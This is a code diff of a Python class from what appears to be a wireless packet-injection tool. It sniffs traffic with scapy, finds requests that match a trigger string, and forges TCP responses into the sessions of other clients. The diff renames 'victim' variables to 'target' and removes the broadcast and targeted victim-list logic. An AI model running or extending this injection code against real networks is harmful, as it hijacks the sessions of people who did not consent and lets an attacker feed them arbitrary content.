@@ -1,38 +1,19 @@
-import socket
 from lib.injector import Injector
-from lib.victim import Victim
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
 from scapy.layers.l2 import Ether, LLC, SNAP
 from scapy.layers.inet import IP, TCP
 from scapy.packet import Raw
-from scapy.utils import wrpcap
 
 class PacketHandler(object):
-    """This class does all the heavy-lifting.
-
-    It has an optional Victims parameter that is a
-    List of instances of Victims for targeted mode.
-
-    It can also be fed an instance of VictimParameters
-    directly if working in broadcast mode and attacking all clients.
-    """
+    """This class does all the heavy-lifting."""
 
     def __init__(self, *positional_parameters, **keyword_parameters):
-
-        self.victims = keyword_parameters.get('victims')
-        if self.victims is None:
-            self.victims = []
-
         self.handler = keyword_parameters.get('handler')
         self.i = keyword_parameters.get('i')
-        self.victim_parameters = keyword_parameters.get('victim_parameters')
+        self.target_parameters = keyword_parameters.get('target_parameters')
 
         if self.i is None:
             print ('[ERROR] No injection interface selected')
-            exit(1)
-
-        if len(self.victims) == 0 and self.victim_parameters is None:
-            print ('[ERROR] Please specify victim parameters or Victim List')
             exit(1)
 
         ## Argument handling
@@ -44,7 +25,7 @@ class PacketHandler(object):
         else:
             self.trigger = args.trigger
 
-        self.newvictims = []
+        ## Injector creation
         self.injector = Injector(self.i, args)
 
 
@@ -59,17 +40,15 @@ class PacketHandler(object):
             if self.trigger in request:
                 if args.tun is False:
                     rtrmac = packet.getlayer(Dot11).addr1
-                    vicmac = packet.getlayer(Dot11).addr2
+                    tgtmac = packet.getlayer(Dot11).addr2
                     dstmac = packet.getlayer(Dot11).addr3
                 else:
                     rtrmac = packet.getlayer(Ether).dst
-                    vicmac = packet.getlayer(Ether).src
+                    tgtmac = packet.getlayer(Ether).src
                     dstmac = None
-
-                ## all
-                vicip = packet.getlayer(IP).src
+                tgtip = packet.getlayer(IP).src
                 svrip = packet.getlayer(IP).dst
-                vicport = packet.getlayer(TCP).sport
+                tgtport = packet.getlayer(TCP).sport
                 svrport = packet.getlayer(TCP).dport
                 size = len(packet.getlayer(TCP).load)
                 acknum = str(int(packet.getlayer(TCP).seq) + size)
@@ -83,13 +62,13 @@ class PacketHandler(object):
                 TSVal = None
                 TSecr = None
 
-            # print(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, TSVal, TSecr)
-            return (vicmac,
+            # print(tgtmac, rtrmac, tgtip, svrip, tgtport, svrport, acknum, seqnum, request, TSVal, TSecr)
+            return (tgtmac,
                     rtrmac,
                     dstmac,
-                    vicip,
+                    tgtip,
                     svrip,
-                    vicport,
+                    tgtport,
                     svrport,
                     acknum,
                     seqnum,
@@ -99,74 +78,15 @@ class PacketHandler(object):
         return None
 
 
-    def proc_injection(self,
-                       vicmac,
-                       rtrmac,
-                       dstmac,
-                       vicip,
-                       svrip,
-                       vicport,
-                       svrport,
-                       acknum,
-                       seqnum,
-                       request,
-                       TSVal,
-                       TSecr,
-                       args):
-        """Process injection function using the PacketHandler.victims List.
-
-        If it was set, to check if the packet belongs to any of the targets.
-        If no victims List is set, meaning it's in broadcast mode, it checks
-        for the victim in PacketHandler.newvictims and gets the injection for it,
-        if there is one, and injects it via Injector.inject().
-
-
-        Gutting some of the logic to concentrate on injection speed
-        """
-        ## Broadcast mode
-        if len(self.victims) == 0:
-
-            for victim in self.newvictims:
-                injection = victim.victim_parameters.file_inject
-                self.injector.inject(vicmac,
-                                     rtrmac,
-                                     dstmac,
-                                     vicip,
-                                     svrip,
-                                     vicport,
-                                     svrport,
-                                     acknum,
-                                     seqnum,
-                                     injection,
-                                     TSVal,
-                                     TSecr)
-
-        ## Targeted mode
-        else:
-            for victim in self.victims:
-                injection = victim.victim_parameters.file_inject
-                self.injector.inject(vicmac,
-                                     rtrmac,
-                                     dstmac,
-                                     vicip,
-                                     svrip,
-                                     vicport,
-                                     svrport,
-                                     acknum,
-                                     seqnum,
-                                     injection,
-                                     TSVal,
-                                     TSecr)
-
     def process(self, interface, pkt, args):
         """Process packets coming from the sniffer"""
         try:
-            vicmac,\
+            tgtmac,\
             rtrmac,\
             dstmac,\
-            vicip,\
+            tgtip,\
             svrip,\
-            vicport,\
+            tgtport,\
             svrport,\
             acknum,\
             seqnum,\
@@ -174,25 +94,18 @@ class PacketHandler(object):
             TSVal,\
             TSecr = self.proc_handler(pkt, args)
 
-            ## Broadcast mode
-            if not args.t:
-                v1 = Victim(ip = vicip,
-                            mac = vicmac,
-                            victim_parameters = self.victim_parameters)
-                self.newvictims.append(v1)
-            self.proc_injection(vicmac,
-                                rtrmac,
-                                dstmac,
-                                vicip,
-                                svrip,
-                                vicport,
-                                svrport,
-                                acknum,
-                                seqnum,
-                                request,
-                                TSVal,
-                                TSecr,
-                                args)
+            self.injector.inject(tgtmac,
+                                 rtrmac,
+                                 dstmac,
+                                 tgtip,
+                                 svrip,
+                                 tgtport,
+                                 svrport,
+                                 acknum,
+                                 seqnum,
+                                 self.target_parameters.file_inject,
+                                 TSVal,
+                                 TSecr)
         except:
             return
 
